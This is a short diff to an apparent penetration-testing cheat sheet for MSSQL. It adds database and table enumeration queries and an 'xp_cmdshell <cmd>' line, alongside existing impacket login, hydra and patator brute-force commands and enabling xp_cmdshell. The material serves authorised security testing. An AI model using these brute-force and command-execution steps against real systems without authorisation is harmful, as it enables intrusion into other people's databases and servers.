@@ -443,12 +443,27 @@ impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
 # NTLM or Kerberos auth
 impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> -windows-auth
 
+# commands
+# show all databases
+SELECT name FROM sys.databases;
+# switch database
+USE <database_name>;
+# show all tables in current database
+SELECT name FROM sys.tables;
+# or for all tables (including system tables):
+SELECT * FROM information_schema.tables;
+# show all columns in a table
+SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table_name>';
+# select data from a table
+SELECT * FROM <table_name>;
+
 # bruteforce
 hydra mssql://<ip> -L <userlist> -P <wordlist>
 patator mssql_login host=<ip> user=sa password=FILE0 0=<wordlist> -x ignore:fgrep='Login failed for user'
 
 # run commands
 enable_xp_cmdshell
+xp_cmdshell <cmd>
 ```
 
 ### RDP - 3389
